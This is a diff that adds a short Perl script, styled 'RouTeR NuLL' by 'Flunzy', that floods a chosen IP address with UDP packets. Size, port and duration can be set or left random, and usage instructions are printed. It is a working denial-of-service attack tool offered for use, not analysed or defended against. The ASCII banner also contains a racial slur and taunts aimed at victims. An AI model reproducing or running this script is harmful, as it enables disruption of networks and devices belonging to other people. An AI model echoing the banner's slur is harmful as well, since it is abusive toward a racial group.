@@ -1,0 +1,68 @@
+#!/usr/bin/perl
+ 
+##############
+# WiFi FlooD.
+##############
+#FSUD
+use Term::ANSIColor qw(:constants); 
+use Socket;
+use strict;
+ 
+if ($#ARGV != 3) {
+  print " \n";
+  print " RouTeR NuLL // by Flunzy\n\n";
+  print " * Order: slam.pl <IP-address> <Port> <Packets> <Time (In seconds)>\n";
+  print " - * Port: Port to flood. Set to 0 for all.\n";
+  print " - * Packets: The number of packets to send. Between 64 and 1024.\n";
+  print " - * Time: Flood time in seconds.\n";
+  exit(1);
+}
+ 
+my ($ip,$port,$size,$time) = @ARGV;
+ 
+my ($iaddr,$endtime,$psize,$pport);
+ 
+$iaddr = inet_aton("$ip") or die "Unable to connect to $ip\n";
+$endtime = time() + ($time ? $time : 1000000);
+ 
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print BOLD RED<<EOTEXT;
+
+oooooooooo                                                       
+ 888    888  ooooooo   oo oooooo                                 
+ 888oooo88   ooooo888   888   888                                
+ 888  88o  888    888   888   888                                
+o888o  88o8 88ooo88 8o o888o o888o                              
+                                                                 
+oooo                                                             
+ 888ooooo  oooo   oooo                                           
+ 888    888 888   888                                            
+ 888    888  888 888                                             
+o888ooo88      8888                                              
+            o8o888 
+                                              
+ooooooooooo o888                                                 
+ 888         888 oooo  oooo  oo oooooo   ooooooooooo oooo   oooo 
+ 888ooo8     888  888   888   888   888       8888    888   888  
+ 888         888  888   888   888   888    8888        888 888   
+o888o       o888o  888o88 8o o888o o888o o888ooooooo     8888    
+                                                      o8o888 
+
+Flunzy RaN ThiS NiGGeRz FucKinG WiFi
+FucKinG WitH The BesT?
+GeT RaN LiKe The ResT.
+EOTEXT
+
+ 
+ 
+print " Flunzy SlaMMeD ThiS $ip with the port " . ($port ? $port : "random") . ", sends to " .
+  ($size ? "$size-byte" : "random size") . " packets" .
+  ($time ? " for $time seconds" : "") . "\n";
+print "Attack stoped with CTRL, C" unless $time;
+ 
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1500-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+ 
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
